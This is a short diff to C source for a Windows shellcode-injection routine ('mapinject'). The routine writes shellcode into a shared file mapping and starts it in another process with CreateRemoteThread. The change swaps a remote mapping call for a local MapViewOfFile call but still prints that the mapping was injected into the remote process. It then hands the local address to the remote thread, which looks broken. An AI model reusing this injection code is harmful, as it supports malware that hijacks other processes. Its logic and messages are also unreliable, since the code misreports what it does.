@@ -42,6 +42,7 @@ int mapinject(int targetProcess)
     printf("\nWritten %d bytes to the global mapping object\n", (DWORD)sizeof(shellcode));
 
     // Map the global file mapping object into the remote process
+    /*
     LPVOID lpMapAddressRemote = MapViewOfFile2(hFileMap, hProc, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
     if (lpMapAddressRemote == NULL)
     {
@@ -49,6 +50,17 @@ int mapinject(int targetProcess)
         return -1;
     }
     printf("\nInjected global object mapping to the remote process with pid %d\n", targetProcess);
+    */
+   
+    // Map the global file mapping object into the remote process
+    LPVOID lpMapAddressRemote = MapViewOfFile(hFileMap, FILE_MAP_EXECUTE, 0, 0, sizeof(shellcode));
+    if (lpMapAddressRemote == NULL)
+    {
+        printf("\nMapViewOfFile failed with error: %d\n", GetLastError());
+        return -1;
+    }
+    printf("\nInjected global object mapping to the remote process with pid %d\n", targetProcess);
+
 
     // Create a remote thread to execute the shellcode
     HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, lpMapAddressRemote, NULL, 0, NULL);
